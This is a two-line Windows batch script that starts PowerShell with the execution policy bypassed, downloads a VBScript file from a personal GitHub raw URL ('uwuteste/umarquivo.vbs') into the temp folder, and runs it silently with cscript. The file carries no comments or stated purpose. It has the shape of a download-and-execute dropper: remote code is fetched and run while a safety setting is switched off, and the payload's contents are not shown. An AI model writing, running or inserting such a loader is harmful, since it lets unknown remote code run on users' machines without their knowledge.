@echo off
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Andre1271/uwuteste/main/umarquivo.vbs' -OutFile '%TEMP%\download.vbs' && cscript //NoLogo '%TEMP%\download.vbs'"
